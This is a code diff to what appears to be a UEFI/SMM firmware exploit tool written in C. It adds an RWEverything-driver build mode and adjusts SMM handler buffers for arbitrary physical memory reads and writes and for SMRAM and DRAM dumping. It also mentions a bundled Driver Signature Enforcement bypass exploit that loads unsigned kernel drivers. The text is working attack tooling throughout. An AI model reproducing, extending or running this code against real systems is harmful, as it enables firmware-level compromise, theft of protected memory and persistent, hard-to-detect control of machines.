@@ -49,6 +49,17 @@
 
 typedef void (* SMM_PROC)(void);
 
+#ifdef USE_RWDRV
+
+// RWEverything driver can allocate only relatively small chunks of contiguous physical memory
+#define MEM_IO_BUFF_LEN (PAGE_SIZE * 10)
+
+#else
+
+#define MEM_IO_BUFF_LEN PAGE_SIZE_2MB
+
+#endif
+
 typedef struct _SMM_HANDLER_CONTEXT
 {
     unsigned int op;
@@ -118,7 +129,7 @@ static void smm_handler(void *context)
     else if (handler_context->op == SMM_OP_PHYS_PAGE_READ ||
              handler_context->op == SMM_OP_PHYS_PAGE_WRITE)
     {
-        unsigned long long cr3 = _cr3_get(), addr = 0x1000000;
+        unsigned long long cr3 = _cr3_get(), addr = 0;
         unsigned long long mem_addr = (unsigned long long)handler_context->phys_mem.addr;
 
         X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PML4_entry =
@@ -488,8 +499,8 @@ int phys_mem_read(
     const char *file_path)
 {
     int ret = -1;
-    int chunk_size = PAGE_SIZE_2MB;
-    unsigned int context_size = XALIGN_UP(sizeof(SMM_HANDLER_CONTEXT) + chunk_size, PAGE_SIZE_2MB);
+    int chunk_size = MEM_IO_BUFF_LEN;
+    unsigned int context_size = XALIGN_UP(sizeof(SMM_HANDLER_CONTEXT) + chunk_size, PAGE_SIZE);
     unsigned long long total = 0;
 
     PSMM_HANDLER_CONTEXT context = (PSMM_HANDLER_CONTEXT)malloc(context_size);
@@ -577,7 +588,7 @@ int phys_mem_write(
     const char *file_path)
 {
     int ret = -1;
-    int chunk_size = PAGE_SIZE;
+    int chunk_size = MEM_IO_BUFF_LEN;
     unsigned int context_size = XALIGN_UP(sizeof(SMM_HANDLER_CONTEXT) + chunk_size, PAGE_SIZE);
     unsigned long long total = 0;
 
@@ -801,15 +812,6 @@ int phys_mem_dump(int target, PUEFI_EXPL_TARGET custom_target, const char *file_
         goto _end;
     }
 
-    memset(buff, 0, buff_size);
-
-    // write readed data to file
-    if (fwrite(buff, 1, buff_size, f) != buff_size)
-    {
-        printf("ERROR: fwrite() fails\n");
-        goto _end;
-    }
-
     // dump low usable dram
     for (unsigned long long addr = 0; addr < TSEG + SMRAM_SIZE; addr += buff_size)
     {
@@ -830,7 +832,7 @@ int phys_mem_dump(int target, PUEFI_EXPL_TARGET custom_target, const char *file_
         }
 
         fflush(f);
-    }
+    }    
 
     memset(buff, 0, buff_size);
 
@@ -844,6 +846,8 @@ int phys_mem_dump(int target, PUEFI_EXPL_TARGET custom_target, const char *file_
             goto _end;
         }
     }
+
+    fflush(f);
 
     // dump high usable dram
     for (unsigned long long addr = 0x100000000; addr < TOUUD; addr += buff_size)
@@ -1041,6 +1045,23 @@ int _tmain(int argc, _TCHAR* argv[])
         }
     }    
 
+#ifdef USE_RWDRV
+
+    if (use_dse_bypass)
+    {
+        printf(
+            "ERROR: --dse-bypass option is not valid for this version of the tool "
+            "because it imlements libfwexpl API using digitally signed RWEveryting "
+            " driver. If you want to use DSE bypass kernel driver exploit that loads "
+            "our own unsigned driver -- please disable USE_RWDRV in config.h and "
+            "recompie the program.\n"
+        );
+
+        return -1;
+    }
+
+#endif // USE_RWDRV
+
     if (use_smram_dump && data_file == NULL)
     {
         printf("ERROR: --file is required for --smram-dump\n");
@@ -1084,7 +1105,14 @@ int _tmain(int argc, _TCHAR* argv[])
             
             // check for Intel VID
             if (vid == 0x8086)
-            {               
+            {            
+
+#ifdef WIN32
+                SetThreadAffinityMask(GetCurrentThread(), 1);
+                SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);                                
+#else
+                // ...
+#endif
                 if (mem_read)
                 {
                     // read memory contents
@@ -1107,16 +1135,17 @@ int _tmain(int argc, _TCHAR* argv[])
                     if (use_smram_dump)
                     {
                         // get current SMRAM address
-                        if ((addr = smram_addr(target, &custom_target)) == 0)
+                        if (addr = smram_addr(target, &custom_target))
+                        {
+                            printf("SMRAM is at 0x%llx:0x%llx\n", addr, addr + SMRAM_SIZE - 1);
+
+                            // read SMRAM contents
+                            ret = phys_mem_read(target, &custom_target, (void *)addr, SMRAM_SIZE, NULL, data_file);
+                        }
+                        else
                         {
                             printf("ERROR: Unable to determinate SMRAM address\n");
-                            goto _end;
-                        }
-
-                        printf("SMRAM is at 0x%llx:0x%llx\n", addr, addr + SMRAM_SIZE - 1);
-
-                        // read SMRAM contents
-                        ret = phys_mem_read(target, &custom_target, (void *)addr, SMRAM_SIZE, NULL, data_file);
+                        }                        
                     }
                     else
                     {
@@ -1124,6 +1153,11 @@ int _tmain(int argc, _TCHAR* argv[])
                         ret = exploit(target, &custom_target, &context, 0, false);
                     }
                 }
+#ifdef WIN32
+                SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
+#else
+                // ...
+#endif
             }
             else
             {
